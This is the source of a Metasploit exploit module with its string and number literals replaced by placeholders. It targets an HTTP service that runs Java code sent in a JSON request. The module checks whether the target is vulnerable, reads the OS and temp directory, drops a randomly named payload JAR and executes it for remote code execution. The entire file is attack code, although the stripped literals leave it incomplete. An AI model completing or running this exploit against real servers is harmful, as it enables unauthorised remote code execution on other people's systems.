require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: Remote :: HttpClient include Msf :: Exploit :: FileDropper def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> , <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > <str> , <str> = > ARCH_JAVA , <str> = > [ [ <str> , { } ] ] , <str> = > <str> , <str> = > <int> ) ) register_options ( [ Opt :: RPORT ( <int> ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) ] , self . class ) end def check result = Exploit :: CheckCode :: Safe if vulnerable? result = Exploit :: CheckCode :: Vulnerable end result end def exploit print_status ( <str> ) unless vulnerable? fail_with ( Failure :: Unknown , <str> peer <str> ) end print_status ( <str> ) res = execute ( java_os ) result = parse_result ( res ) if result . nil? fail_with ( Failure :: Unknown , <str> peer <str> ) else print_good ( <str> result <str> ) end jar_file = <str> if result =~ <str> print_status ( <str> ) res = execute ( java_tmp_dir ) result = parse_result ( res ) if result . nil? fail_with ( Failure :: Unknown , <str> peer <str> ) else print_good ( <str> result <str> ) end jar_file = <str> result <str> rand_text_alpha ( <int> + rand ( <int> ) ) <str> else jar_file = File . join ( datastore [ <str> ] , <str> rand_text_alpha ( <int> + rand ( <int> ) ) <str> ) end register_file_for_cleanup ( jar_file ) execute ( java_payload ( jar_file ) ) end def vulnerable? java = <str> vprint_status ( <str> ) res = execute ( java ) result = parse_result ( res ) if result . nil? vprint_status ( <str> ) return false elsif result =~ <str> vprint_status ( <str> result <str> ) return true else vprint_status ( <str> result <str> ) return false end end def parse_result ( res ) unless res vprint_error ( <str> peer <str> ) return nil end unless res . code == <int> && res . body vprint_error ( <str> peer <str> res . code <str> res . body ? <str> : <str> ) return nil end begin json = JSON . parse ( res . body . to_s ) rescue JSON :: ParserError return nil end begin result = json [ <str> ] [ <str> ] [ <int> ] [ <str> ] [ <str> ] rescue return nil end result . is_a? ( :: Array ) ? result . first : result end def to_java_byte_array ( str ) buff = <str> str . length <str> i = <int> str . unpack ( <str> ) . each do | c | buff << <str> i <str> c <str> i = i + <int> end buff end def java_os <str> end def java_tmp_dir <str> end def java_payload ( file_name ) source = <<- <str> EOF <str> <str> EOF source end def execute ( java ) payload = { <str> = > <int> , <str> = > { <str> = > { <str> = > { <str> = > { } } } } , <str> = > { <str> = > { <str> = > java } } } res = send_request_cgi ( { <str> = > normalize_uri ( target_uri . path . to_s , <str> ) , <str> = > <str> , <str> = > JSON . generate ( payload ) } ) return res end end 
